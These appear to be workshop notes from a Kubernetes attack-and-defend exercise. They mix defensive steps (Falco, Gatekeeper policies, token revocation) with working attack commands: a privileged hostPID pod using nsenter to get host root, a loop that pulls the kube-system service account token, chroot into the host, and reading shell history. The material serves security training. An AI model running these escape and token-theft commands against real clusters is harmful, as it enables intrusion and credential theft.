# Attacking and Defending K8s clusters


https://securekubernetes.com/




id 
uname -a

cat /etc/lsb-release /etc/redhat-release


kubectl auth can-i --list

kubectl auth can-i create pods


Defense


kubectl top node

k top pod --all-namespaces


## Get all images running in the cluster

kubectl get pods --all-namespaces -o jsonpath="{..image}" | tr -s '[[:space:]]' '\n' | sort -u


## Get pods running as default service account

kubectl get pods -n prd -o jsonpath='{range .items[?(@.spec.serviceAccountName=="default")]}{.metadata.name}{" "}{.spec.serviceAccountName}{"\n"}{end}'


## Security example apply

kubectl apply -f https://raw.githubusercontent.com/securekubernetes/securekubernetes/master/manifests/security.yml

Adds Falco

### View Falco Logs

kubectl logs -n falco $(kubectl get pod -n falco -l app=falco -o=name) -f


### Falco Rules

kubectl get configmaps -n falco falco-config -o json | jq -r '.data."falco_rules.yaml"' | grep rule:

kubectl get configmaps -n falco falco-config -o json | jq -r '.data."k8s_audit_rules.yaml"' | grep rule:

## Deploy a pod that gives host access
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'

This spawns a container in the host namespace - a container without walls


id; uname -a; cat /etc/lsb-release /etc/redhat-release; ps -ef; env | grep -i kube

This verifies you are root on the host

docker container ls


## Getting the kubelet config

ps -ef | grep kubelet

kubectl --kubeconfig /var/lib/kubelet/kubeconfig auth can-i create pod -n kube-system

### Get the kubesystem default token

TOKEN=$(for i in `mount | sed -n '/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p'`; do if [ `cat $i` = 'kube-system' ]; then cat `echo $i | sed 's/.namespace$/\/token/'`; break; fi; done)
echo -e "\n\nYou'll want to copy this for later:\n\nTOKEN=\"$TOKEN\""


kubectl --token "$TOKEN" --insecure-skip-tls-verify --server=https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT auth can-i get secrets --all-namespaces





## 
We might want to revoke that serviceaccount token:


kubectl -n dev delete $(kubectl -n dev get secret -o name| grep default)
And perhaps disable the automatic mounting of serviceaccount tokens by setting automountServiceAccountToken: false in the pod spec, if the dashboard doesn't need it.

automountServiceAccountToken: false



The attacker ran a privileged container, which they shouldn't have been able to. So, we should block that. I remember a talk at KubeCon this week about Open-Policy-Agent/Gatekeeper that gets deployed as an admission controller.


## Setup OPA Gateway

kubectl apply -f https://raw.githubusercontent.com/securekubernetes/securekubernetes/master/manifests/security2.yaml
sleep 10
kubectl apply -f https://raw.githubusercontent.com/securekubernetes/securekubernetes/master/manifests/security2-policies.yaml
sleep 15 # Allow time for the Dynamic Admission Controller to take effect



The policies

https://raw.githubusercontent.com/securekubernetes/securekubernetes/master/manifests/security2.yaml


https://raw.githubusercontent.com/securekubernetes/securekubernetes/master/manifests/security2-policies.yaml


container created last


docker constainer ls --latest


chroot /rootfs /bin/bash

cd /home/kubernetes
ls

cat .bash_history

